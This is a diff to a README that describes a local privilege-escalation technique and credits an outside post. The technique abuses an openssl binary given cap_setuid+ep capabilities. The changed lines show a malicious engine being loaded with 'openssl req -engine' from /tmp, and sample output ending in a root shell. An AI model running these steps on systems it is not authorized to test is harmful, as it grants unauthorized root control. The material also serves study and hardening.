@@ -1,12 +1,13 @@
-# All credit goes to chaudhary1337 check out the original at:
+# All credit goes to chaudhary1337 
+**check out the original post:**
 https://chaudhary1337.github.io/p/how-to-openssl-cap_setuid-ep-privesc-exploit/
 
-### *Modified by LV6LV*
+**---- *Modified by LV6LV* ----**
 
 Consider the binary /usr/bin/openssl has capabilities set as: /usr/bin/openssl = cap_setuid+ep 
 
 Is there a way to become root from a normal user by using this? 
-yes... yes there is a way.
+> yes... yes there is a way.
 
 ## Search all the binaries' capibilities using: 
 ```
@@ -62,12 +63,12 @@ Once you have the file, run the following, at the location of the so file.
 openssl req -engine <full path to openssl-exploit-engine.so file>
 
 Sample output if openssl-exploit-engine.so is located in the /tmp directory
-
-user@server:~$ openssl req -engine /tmp/openssl-exploit-engine.so
-root@server:~# whoami
+```
+$ openssl req -engine /tmp/openssl-exploit-engine.so
+# whoami
 root
-  
-Enjoy!
+```
+**Enjoy!**
 
 ## Common Errors
 > fatal error: openssl/engine.h: No such file or directory #include <openssl/engine.h>
